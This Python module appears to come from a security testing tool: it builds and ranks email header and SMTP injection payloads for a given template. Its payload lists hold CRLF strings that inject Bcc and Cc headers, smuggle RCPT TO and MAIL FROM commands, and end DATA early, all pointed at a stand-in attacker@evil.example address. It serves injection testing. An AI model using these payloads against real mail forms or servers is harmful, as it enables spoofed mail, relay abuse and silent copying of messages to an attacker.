"""Email header / SMTP injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_mail_context

# An email header value: fold in extra headers or an attacker body.
_HEADER_BODIES = [
    ("\r\nBcc: attacker@evil.example", "bcc-header"),
    ("\r\nCc: attacker@evil.example", "cc-header"),
    ("\r\nX-Injected: 1", "custom-header"),
    ("\r\n\r\nInjected body content", "body-override"),
    ("%0d%0aBcc: attacker@evil.example", "encoded-bcc"),
    ("\nBcc: attacker@evil.example", "bare-lf-bcc"),
]

# A raw SMTP command line: smuggle a second command.
_SMTP_BODIES = [
    ("\r\nRCPT TO:<attacker@evil.example>", "rcpt-smuggle"),
    ("\r\nMAIL FROM:<spoofed@evil.example>", "mail-from-smuggle"),
    ("\r\nDATA", "data-smuggle"),
    ("%0d%0aRCPT TO:<attacker@evil.example>", "encoded-rcpt"),
]

# The message body: end DATA and open a new transaction.
_BODY_BODIES = [
    ("\r\n.\r\nMAIL FROM:<spoofed@evil.example>", "terminator-mail-from"),
    ("\r\n.\r\nRCPT TO:<attacker@evil.example>", "terminator-rcpt"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class MailCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class MailMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[MailCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    return {
        Context.MAIL_HEADER: _HEADER_BODIES,
        Context.SMTP_COMMAND: _SMTP_BODIES,
        Context.MAIL_BODY: _BODY_BODIES,
    }.get(context, _HEADER_BODIES)


def mutate_mail(template: str) -> MailMutationResult:
    """Generate and rank mail-injection payloads for ``template``."""
    from .analyzer import analyze_mail

    context = analyze_mail_context(template)
    generated = _bodies(context)

    candidates: list[MailCandidate] = []
    for payload, strategy in generated:
        result = analyze_mail(template, payload)
        b = result.breakout
        if b.command_injected or "encoded" in b.separators:
            candidates.append(
                MailCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return MailMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
